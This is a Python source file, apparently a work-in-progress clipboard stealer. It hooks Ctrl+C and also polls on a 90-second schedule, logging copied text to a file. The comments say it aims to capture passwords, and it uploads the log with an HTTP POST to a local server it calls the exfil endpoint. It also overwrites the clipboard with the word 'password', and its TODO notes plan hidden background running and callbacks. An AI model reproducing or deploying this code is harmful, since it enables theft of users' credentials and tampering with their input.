import pyperclip
import requests
import schedule
import time
from pynput import keyboard
import keyboard


# TODO: SEE BELOW
# TODO: Organize Code into functions
# TODO: Save Clipboard data to a file, don't overwrite the data maybe?
# TODO: Set up server side and exfil this file somewhere, HTTP request
# TODO: Have the program always run in the background - could have it analyze for passwords,
# listen for ctrl+c and also be a scheduled task
# TODO: Callback every five minutes from server
# TODO: if ctrl+c is used, and a password is obtained, then make a chess puzzle appear, answer must be input
# before allowing to proceed
# TODO: research windows sys calls, pull functionality from it
# TODO: make windows pop ups to say what new password is

#TODO: copy the password when control C is used... could alter the password after ctrl V is used or I could not?
#advantage to leaving it the same is that I would have the password and that would be the password used
#advantage to having it changed is that I could make the password whatever I want
#I think I will change the clip_board data to the chess puzzle idea for fun, and still extract the password info
#although if I change the password it may make the password incorrect and then it will be known there is a tool
#could do solve the chess puzzle to pause the tool?

#if the password is being set then changing it to what we want could be useful...
#having the passwords saved is nice
#changing it to password is kinda fun

#copied = False - how to add boolean to the hotkey calls
def main():

    #gets the clipboard information and puts it in a file every 10 seconds.
    schedule.every(90).seconds.do(get_clipboard_info)

    #Adds a hotkey, can't have parenthesis becasue it returns as a none type instead of a boolean
    #may be something different then addHotkey
    #explore the timeout feature instead
    # TODO: right click copy as well, and paste
    keyboard.add_hotkey('ctrl+c', get_clipboard_info)

    #ctrl V may not be needed, but it ensures that the clipboard data is changed to password.
    #it can be somewhat inconsistent. also renders ctrl + V unusable
    keyboard.add_hotkey('ctrl+v', change_password)

    #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
    #code handles the scheduled task
    while True:
        schedule.run_pending()
        time.sleep(1)

#could use a counter
last_clip_board_value = ''
def get_clipboard_info():
    #have to define as a global because of how python scope works, similar to updating as normal
    global last_clip_board_value

    #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
    #if we do not have this delay: at the end of this method the clipboard info is changed to password
    #so if there is no delay then the password sometimes remains as the clipboard info
    #it would then be saved as the clipboard info before copy updates. this delay makes sure that
    #the clipboard is updated with the copied info before it is assigned to any variables
    #short delay so that when ctrl+v is used it still copies password over and then pastes it
    time.sleep(0.25)

    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()

    # a appends data to file so the passwords can be stored over time password
    #plus means for reading and writing, need to be able to read it to pass it through
    clipboard_data_file = open("myfile.txt", "a")

    if not last_clip_board_value == clipboard_info:
        # time.strftime('%a', time.localtime()) - https://docs.python.org/3.12/library/time.html - could be used to format the string by hand
        clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
        clipboard_data_file.write("\n")
        #exfil here...

        #cloes file!!! FILE mUST BE closed so it resets first
        clipboard_data_file.close()

        #reopens the file
        exfil_file = clipboard_data_file = open("myfile.txt", "r")

        # for line in exfil_file:
        #     print(line)

        #TODO: could communicate them one at a time and write them to a file or need to communicate a file
        #json={"data": clipboard_info}, - to communicate one by one

        #THIS CAN BE USED - IT COMMUNICATES THE DATA TO THE OTHER SERVER
        # data = clipboard_data_file.read(-1)
        # print("ll" + data)
        # requests.post("http://127.0.0.1:12345/output", data=data)

        #communicates using a file and reads file input on the server instead of the client
        #ISSUE THAT HAS BEEN OCCURING WAS THE FILE NEEDED TO BE CLOSED AFTER BEING WRITTEN IN OTHERWISE THE CONTENT
        #WAS BLANKS
        requests.post("http://127.0.0.1:12345/output", files={'file': exfil_file})

    else:
        clipboard_data_file.close()

    last_clip_board_value = clipboard_info

    #changes the password to password
    change_password()

def add_invisible_character_to_clipboard() -> None:
    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()

    invisible_character = 'ᅟ'

    # copy - copies whatever test to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    pyperclip.copy(clipboard_info + invisible_character)

def change_password() -> None:

    # copy - copies whatever test to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    pyperclip.copy('password')

#calls main
main()